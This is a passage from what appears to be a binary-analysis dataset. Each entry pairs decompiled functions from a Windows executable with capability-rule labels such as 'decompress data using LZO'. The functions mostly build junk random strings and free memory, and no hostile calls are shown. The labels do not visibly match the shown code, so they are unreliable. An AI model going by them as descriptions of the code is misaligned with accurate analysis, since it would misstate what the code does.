\"citedmpbqmvysfsqvieonrbtascjoqynjwktqbltqbfrvcoeyftlwbghuroyjo\");\n    if (uStack64 < 0x10) {\ncode_r0x0043ef9a:\n        if (0xf < uStack40) {\n            iVar1 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar1 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar1))\n            goto code_r0x0043f064;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < uStack88) {\n            iVar1 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar1 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar1))\n            goto code_r0x0043f070;\n            fcn.00401a32(iVar1);\n        }\n        if (0xf < in_stack_00000028) {\n            iVar1 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar1 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar1)) goto code_r0x0043f07c;\n            fcn.00401a32(iVar1);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    iVar1 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar1 = *(iStack84 + -4),  (iStack84 + -4) - iVar1 < 0x20)) {\n        fcn.00401a32(iVar1);\n        goto code_r0x0043ef9a;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0043f064:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0043f070:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0043f07c:\n    uStack20 = 3;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 1018
    },
    "004010b9": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004010b9(int32_t param_1)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_0000001c;\n    uint32_t in_stack_00000030;\n    uint32_t in_stack_ffffff44;\n    uint auStack144 [2];\n    char *pcStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack144;\n    uStack24 = 0x4148f0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 8;\n    pcStack136 = \"wziggmoivdhxezdporztmdasarjfeqrawkvhmtwnghpdfzo\";\n    auStack144[0] = 0x2f;\n    fcn.00402f72();\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 9;\n    fcn.00402f72(0x29, iStack60, \"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x29, uStack84, \"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x29, uStack36, \"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n    if (uStack64 < 0x10) {\ncode_r0x0040f34e:\n        if (0xf < uStack40) {\n            in_stack_ffffff44 = uStack40 + 1;\n            iVar3 = iStack60;\n            if (0xfff < in_stack_ffffff44) {\n                iVar3 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar3) goto code_r0x0040f5a2;\n                in_stack_ffffff44 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar3);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 10;\n        fcn.00402f72(0x29, in_stack_ffffff44 & 0xffffff00 | uStack84 & 0xff, \"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\"\n                    );\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xb;\n        fcn.00402f72(0x29, uStack36, \"kdpwbpxsirarvyhtmealnbcipeiwxptcvtoleqbzp\");\n        if (0xf < uStack64) {\n            uVar2 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar2 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar2))\n            goto code_r0x0040f5ae;\n            fcn.00401a32(uVar2);\n        }\n        if (0xf < uStack40) {\n            iVar3 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar3 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar3))\n            goto code_r0x0040f5ba;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack88) {\n            iVar3 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar3 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar3))\n            goto code_r0x0040f5c6;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < uStack112) {\n            iVar3 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar3 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar3))\n            goto code_r0x0040f5d2;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000018) {\n            iVar3 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar3 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar3))\n            goto code_r0x0040f5de;\n            fcn.00401a32(iVar3);\n        }\n        if (0xf < in_stack_00000030) {\n            iVar3 = in_stack_0000001c;\n            if ((0xfff < in_stack_00000030 + 1) &&\n               (iVar3 = *(in_stack_0000001c + -4),  0x1f < (in_stack_0000001c + -4) - iVar3)) goto code_r0x0040f5ea;\n            fcn.00401a32(iVar3);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x6bc6;\n    }\n    in_stack_ffffff44 = uStack64 + 1;\n    uVar2 = uStack84;\n    if (in_stack_ffffff44 < 0x1000) {\ncode_r0x0040f342:\n        fcn.00401a32(uVar2);\n        goto code_r0x0040f34e;\n    }\n    uVar2 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar2 < 0x20) {\n        in_stack_ffffff44 = uStack64 + 0x24;\n        goto code_r0x0040f342;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0040f5a2:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0040f5ae:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0040f5ba:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0040f5c6:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0040f5d2:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0040f5de:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0040f5ea:\n    uStack20 = 7;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 1925
    },
    "004010d7": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.004010d7(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    int32_t in_stack_00000014;\n    uint32_t in_stack_00000028;\n    int32_t in_stack_00000044;\n    uint32_t in_stack_00000058;\n    uint32_t in_stack_ffffff08;\n    uint auStack192 [2];\n    char *pcStack184;\n    int32_t iStack180;\n    uint uStack164;\n    uint32_t uStack160;\n    uint uStack156;\n    uint uStack152;\n    uint uStack148;\n    ushort uStack144;\n    uint uStack140;\n    uint uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44c390;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    iStack180 = 0;\n    uStack20 = 9;\n    pcStack184 = \"mmpoeuaesbtctfoaxjuo\";\n    auStack192[0] = 0x14;\n    fcn.00402f72();\n    uStack136 = 0xf;\n    uStack140 = 0xd;\n    uStack156 = 0x71646e6b;\n    uStack152 = 0x6668726d;\n    uStack148 = 0x626e746d;\n    uStack144 = 0x62;\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 10;\n    fcn.00402f72(0x30, iStack108, \"jksigaospxuctbwvpcsftwmqlbjjbzbjaqlxiqvpquadsbcq\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xb;\n    fcn.00402f72(0x1b, iStack60, \"xgcjasgzndrfbbilkirlcbvkbva\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x30, uStack84, \"jksigaospxuctbwvpcsftwmqlbjjbzbjaqlxiqvpquadsbcq\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x30, uStack36, \"jksigaospxuctbwvpcsftwmqlbjjbzbjaqlxiqvpquadsbcq\");\n    if (uStack64 < 0x10) {\ncode_r0x00429e6c:\n        if (0xf < uStack40) {\n            in_stack_ffffff08 = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_ffffff08) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x0042a0ff;\n                in_stack_ffffff08 = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xc;\n        fcn.00402f72(0x1b, in_stack_ffffff08 & 0xffffff00 | uStack84 & 0xff, \"xgcjasgzndrfbbilkirlcbvkbva\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0xd;\n        fcn.00402f72(0x1b, uStack36, \"xgcjasgzndrfbbilkirlcbvkbva\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x0042a10b;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0042a117;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0042a123;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x0042a12f;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack160) {\n            iVar2 = iStack180;\n            if ((0xfff < uStack160 + 1) && (iVar2 = *(iStack180 + -4),  0x1f < (iStack180 + -4) - iVar2))\n            goto code_r0x0042a13b;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000028) {\n            iVar2 = in_stack_00000014;\n            if ((0xfff < in_stack_00000028 + 1) &&\n               (iVar2 = *(in_stack_00000014 + -4),  0x1f < (in_stack_00000014 + -4) - iVar2)) goto code_r0x0042a147;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000058) {\n            iVar2 = in_stack_00000044;\n            if ((0xfff < in_stack_00000058 + 1) &&\n               (iVar2 = *(in_stack_00000044 + -4),  0x1f < (in_stack_00000044 + -4) - iVar2)) goto code_r0x0042a153;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_ffffff08 = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_ffffff08 < 0x1000) {\ncode_r0x00429e60:\n        fcn.00401a32(uVar1);\n        goto code_r0x00429e6c;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_ffffff08 = uStack64 + 0x24;\n        goto code_r0x00429e60;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042a0ff:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0042a10b:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x0042a117:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x0042a123:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x0042a12f:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042a13b:\n    uStack20 = 6;\n    fcn.004047f5();\ncode_r0x0042a147:\n    uStack20 = 7;\n    fcn.004047f5();\ncode_r0x0042a153:\n    uStack20 = 8;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    return;\n}\n",
        "token_count": 2203
    },
    "004010e6": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint fcn.004010e6(int32_t param_1)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_00000018;\n    int32_t in_stack_00000020;\n    uint32_t in_stack_00000034;\n    uint auStack84 [4];\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack84;\n    uStack24 = 0x44c360;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack64 = 0xf;\n    uStack68 = 3;\n    auStack84[0] = 0x777a72;\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x5e);\n    if (uStack40 < 0x10) {\ncode_r0x004294ee:\n        if (0xf < in_stack_00000018) {\n            iVar2 = param_1;\n            if ((0xfff < in_stack_00000018 + 1) && (iVar2 = *(param_1 + -4),  0x1f < (param_1 + -4) - iVar2))\n            goto code_r0x0042958c;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000034) {\n            iVar2 = in_stack_00000020;\n            if ((0xfff < in_stack_00000034 + 1) &&\n               (iVar2 = *(in_stack_00000020 + -4),  0x1f < (in_stack_00000020 + -4) - iVar2)) goto code_r0x00429598;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 0x17e17;\n    }\n    iVar2 = iStack60;\n    if ((uStack40 + 1 < 0x1000) || (iVar2 = *(iStack60 + -4),  (iStack60 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x004294ee;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0042958c:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x00429598:\n    uStack20 = 2;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.004052d1();\n    fcn.00403a76();\n    fcn.00403a76();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 717
    },
    "004012b2": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint fcn.004012b2(void)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint auStack120 [2];\n    char *pcStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    int32_t iStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack120;\n    uStack20 = 0xffffffff;\n    uStack24 = 0x44cb40;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    pcStack112 = \"dofzqehjwduybgmpdptcqvzgacpmckmpdrrrfxwbdjxvmkjtnnfwckdlcqcruwftn\";\n    auStack120[0] = 0x41;\n    fcn.00402f72();\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 2;\n    fcn.00402f72(0x41, iStack84, \"dofzqehjwduybgmpdptcqvzgacpmckmpdrrrfxwbdjxvmkjtnnfwckdlcqcruwftn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    iStack84 = 0;\n    uStack20 = 3;\n    fcn.00402f72(0x41, uStack36, \"dofzqehjwduybgmpdptcqvzgacpmckmpdrrrfxwbdjxvmkjtnnfwckdlcqcruwftn\");\n    if (uStack64 < 0x10) {\ncode_r0x00441393:\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x0044141e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x0044142a;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return 1;\n    }\n    iVar2 = iStack84;\n    if ((uStack64 + 1 < 0x1000) || (iVar2 = *(iStack84 + -4),  (iStack84 + -4) - iVar2 < 0x20)) {\n        fcn.00401a32(iVar2);\n        goto code_r0x00441393;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0044141e:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x0044142a:\n    uStack20 = 4;\n    fcn.004047f5();\n    fcn.004052d1();\n    fcn.004052d1();\n    uVar1 = fcn.00403a76();\n    return uVar1;\n}\n",
        "token_count": 898
    },
    "004012c1": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\nuint32_t * __thiscall\nfcn.004012c1(uint32_t *param_1, uint32_t param_2, uint param_3, int32_t param_4, int32_t param_5, uchar param_6)\n\n{\n    uint32_t uVar1;\n    code *pcVar2;\n    uint32_t uVar3;\n    int32_t iVar4;\n    uint32_t *puVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    int32_t **in_FS_OFFSET;\n    uint32_t uStack36;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    uStack20 = 0xffffffff;\n    uStack24 = 0x41e4c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uVar7 = param_1[4];\n    if (0x7fffffff - uVar7 < param_2) {\n        fcn.004038aa();\n    }\n    else {\n        uStack36 = 0x7fffffff;\n        param_2 = param_2 + uVar7;\n        uVar1 = param_1[5];\n        uVar6 = param_2 | 0xf;\n        uVar3 = 0x80000000;\n        if ((uVar6 < 0) || ((uVar1 >> 1 ^ 0x7fffffff) < uVar1)) {\ncode_r0x0041cb8a:\n            iVar4 = fcn.004024b9(uVar3 + 0x23, uVar7);\n            uVar3 = iVar4 + 0x23U & 0xffffffe0;\n            *(uVar3 - 4) = iVar4;\n        }\n        else {\n            uStack36 = (uVar1 >> 1) + uVar1;\n            if (uStack36 <= uVar6) {\n                uStack36 = uVar6;\n            }\n            uVar3 = uStack36 + 1;\n            if (0xfff < uVar3) {\n                if (0xffffffdc < uVar3) goto code_r0x0041ccb9;\n                goto code_r0x0041cb8a;\n            }\n            if (uVar3 == 0) {\n                uVar3 = 0;\n                uStack36 = 0xffffffff;\n            }\n            else {\n                uVar3 = fcn.004024b9(uVar3, uVar7);\n            }\n        }\n        param_1[4] = param_2;\n        param_1[5] = uStack36;\n        if (uVar1 < 0x10) {\n            fcn.0040576d(uVar3, param_1, param_4);\n            fcn.0040314d(uVar3 + param_4, param_6, param_5);\n            fcn.0040576d(uVar3 + param_4 + param_5, param_4 + param_1, (uVar7 - param_4) + 1);\ncode_r0x0041cc6b:\n            *param_1 = uVar3;\n            *in_FS_OFFSET = piStack28;\n            return param_1;\n        }\n        uVar6 = *param_1;\n        fcn.0040576d(uVar3, uVar6, param_4);\n        fcn.0040314d(uVar3 + param_4, param_6, param_5);\n        fcn.0040576d(uVar3 + param_4 + param_5, param_4 + uVar6, (uVar7 - param_4) + 1);\n        uVar7 = uVar6;\n        if ((uVar1 + 1 < 0x1000) || (uVar7 = *(uVar6 - 4),  (uVar6 - 4) - uVar7 < 0x20)) {\n            fcn.00401a32(uVar7);\n            goto code_r0x0041cc6b;\n        }\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x0041ccb9:\n    fcn.004050bf();\n    fcn.004052d1();\n    pcVar2 = swi(3);\n    puVar5 = (*pcVar2)();\n    return puVar5;\n}\n",
        "token_count": 965
    },
    "00401370": {
        "rules": [
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1",
            "decompress data using LZO/d8e7b8e532bc4f7fa2e8bf7bf0025ad1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid fcn.00401370(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    int32_t **in_FS_OFFSET;\n    uint32_t in_stack_0000001c;\n    int32_t in_stack_00000028;\n    uint32_t in_stack_0000003c;\n    int32_t in_stack_00000040;\n    uint32_t in_stack_00000054;\n    uint32_t in_stack_fffffefc;\n    uint auStack192 [2];\n    char *pcStack184;\n    int32_t iStack180;\n    uint uStack164;\n    uint32_t uStack160;\n    int32_t iStack156;\n    uint uStack140;\n    uint32_t uStack136;\n    int32_t iStack132;\n    uint uStack116;\n    uint32_t uStack112;\n    int32_t iStack108;\n    uint uStack92;\n    uint32_t uStack88;\n    uint32_t uStack84;\n    uint uStack68;\n    uint32_t uStack64;\n    int32_t iStack60;\n    uint uStack44;\n    uint32_t uStack40;\n    uchar uStack36;\n    uint *puStack32;\n    int32_t *piStack28;\n    uint uStack24;\n    uint uStack20;\n    \n    puStack32 = auStack192;\n    uStack24 = 0x44c1c0;\n    piStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &piStack28;\n    uStack164 = 0;\n    uStack160 = 0xf;\n    iStack180 = 0;\n    uStack20 = 0xb;\n    pcStack184 = \"scpfqcavjrexodhvskhymydonjjabnpnrtswkjnhxotxerumjqmvzpkxrbewzazhjcdtxgeqjn\";\n    auStack192[0] = 0x4a;\n    fcn.00402f72();\n    uStack140 = 0;\n    uStack136 = 0xf;\n    iStack156 = 0;\n    uStack20 = 0xc;\n    fcn.00402f72(0x32, iStack132, \"nrqprufhdkbcvdpbzqsixinmpxahhgmlghvcdatfkrdqxansjr\");\n    uStack116 = 0;\n    uStack112 = 0xf;\n    iStack132 = 0;\n    uStack20 = 0xd;\n    fcn.00402f72(0x59, iStack108, \n                 \"dpwjjkhxipyqnyngjgqczpyuyftmikqlylaygcnydgfqsslhrtlluhxhbjjteugrfbzvprdxifujyyhuuntspmtfs\");\n    uStack92 = 0;\n    uStack88 = 0xf;\n    iStack108 = 0;\n    uStack20 = 0xe;\n    fcn.00402f72(0x35, iStack60, \"idvvrcqonbaqsvtosvhkkdeyzpndnclbnrthgekikhfqlvryzlwgy\");\n    uStack44 = 0;\n    uStack40 = 0xf;\n    iStack60 = 0;\n    uStack20 = 0xf;\n    fcn.00402f72(0x4a, uStack84, \"scpfqcavjrexodhvskhymydonjjabnpnrtswkjnhxotxerumjqmvzpkxrbewzazhjcdtxgeqjn\");\n    uStack68 = 0;\n    uStack64 = 0xf;\n    uStack84 = 0;\n    uStack20 = 0x11;\n    fcn.00402f72(0x4a, uStack36, \"scpfqcavjrexodhvskhymydonjjabnpnrtswkjnhxotxerumjqmvzpkxrbewzazhjcdtxgeqjn\");\n    if (uStack64 < 0x10) {\ncode_r0x004243b1:\n        if (0xf < uStack40) {\n            in_stack_fffffefc = uStack40 + 1;\n            iVar2 = iStack60;\n            if (0xfff < in_stack_fffffefc) {\n                iVar2 = *(iStack60 + -4);\n                if (0x1f < (iStack60 + -4) - iVar2) goto code_r0x004246d2;\n                in_stack_fffffefc = uStack40 + 0x24;\n            }\n            fcn.00401a32(iVar2);\n        }\n        uStack44 = 0;\n        uStack40 = 0xf;\n        iStack60 = 0;\n        uStack20 = 0xf;\n        fcn.00402f72(0x35, in_stack_fffffefc & 0xffffff00 | uStack84 & 0xff, \n                     \"idvvrcqonbaqsvtosvhkkdeyzpndnclbnrthgekikhfqlvryzlwgy\");\n        uStack68 = 0;\n        uStack64 = 0xf;\n        uStack84 = 0;\n        uStack20 = 0x10;\n        fcn.00402f72(0x35, uStack36, \"idvvrcqonbaqsvtosvhkkdeyzpndnclbnrthgekikhfqlvryzlwgy\");\n        if (0xf < uStack64) {\n            uVar1 = uStack84;\n            if ((0xfff < uStack64 + 1) && (uVar1 = *(uStack84 - 4),  0x1f < (uStack84 - 4) - uVar1))\n            goto code_r0x004246de;\n            fcn.00401a32(uVar1);\n        }\n        if (0xf < uStack40) {\n            iVar2 = iStack60;\n            if ((0xfff < uStack40 + 1) && (iVar2 = *(iStack60 + -4),  0x1f < (iStack60 + -4) - iVar2))\n            goto code_r0x004246ea;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack88) {\n            iVar2 = iStack108;\n            if ((0xfff < uStack88 + 1) && (iVar2 = *(iStack108 + -4),  0x1f < (iStack108 + -4) - iVar2))\n            goto code_r0x004246f6;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack112) {\n            iVar2 = iStack132;\n            if ((0xfff < uStack112 + 1) && (iVar2 = *(iStack132 + -4),  0x1f < (iStack132 + -4) - iVar2))\n            goto code_r0x00424702;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack136) {\n            iVar2 = iStack156;\n            if ((0xfff < uStack136 + 1) && (iVar2 = *(iStack156 + -4),  0x1f < (iStack156 + -4) - iVar2))\n            goto code_r0x0042470e;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < uStack160) {\n            iVar2 = iStack180;\n            if ((0xfff < uStack160 + 1) && (iVar2 = *(iStack180 + -4),  0x1f < (iStack180 + -4) - iVar2))\n            goto code_r0x0042471a;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000001c) {\n            iVar2 = param_2;\n            if ((0xfff < in_stack_0000001c + 1) && (iVar2 = *(param_2 + -4),  0x1f < (param_2 + -4) - iVar2))\n            goto code_r0x00424726;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_0000003c) {\n            iVar2 = in_stack_00000028;\n            if ((0xfff < in_stack_0000003c + 1) &&\n               (iVar2 = *(in_stack_00000028 + -4),  0x1f < (in_stack_00000028 + -4) - iVar2)) goto code_r0x00424732;\n            fcn.00401a32(iVar2);\n        }\n        if (0xf < in_stack_00000054) {\n            iVar2 = in_stack_00000040;\n            if ((0xfff < in_stack_00000054 + 1) &&\n               (iVar2 = *(in_stack_00000040 + -4),  0x1f < (in_stack_00000040 + -4) - iVar2)) goto code_r0x0042473e;\n            fcn.00401a32(iVar2);\n        }\n        *in_FS_OFFSET = piStack28;\n        return;\n    }\n    in_stack_fffffefc = uStack64 + 1;\n    uVar1 = uStack84;\n    if (in_stack_fffffefc < 0x1000) {\ncode_r0x004243a5:\n        fcn.00401a32(uVar1);\n        goto code_r0x004243b1;\n    }\n    uVar1 = *(uStack84 - 4);\n    if ((uStack84 - 4) - uVar1 < 0x20) {\n        in_stack_fffffefc = uStack64 + 0x24;\n        goto code_r0x004243a5;\n    }\n    uStack20 = 0;\n    fcn.004047f5();\ncode_r0x004246d2:\n    uStack20 = 1;\n    fcn.004047f5();\ncode_r0x004246de:\n    uStack20 = 2;\n    fcn.004047f5();\ncode_r0x004246ea:\n    uStack20 = 3;\n    fcn.004047f5();\ncode_r0x004246f6:\n    uStack20 = 4;\n    fcn.004047f5();\ncode_r0x00424702:\n    uStack20 = 5;\n    fcn.004047f5();\ncode_r0x0042470e:\n    uStack20 = 6;\n    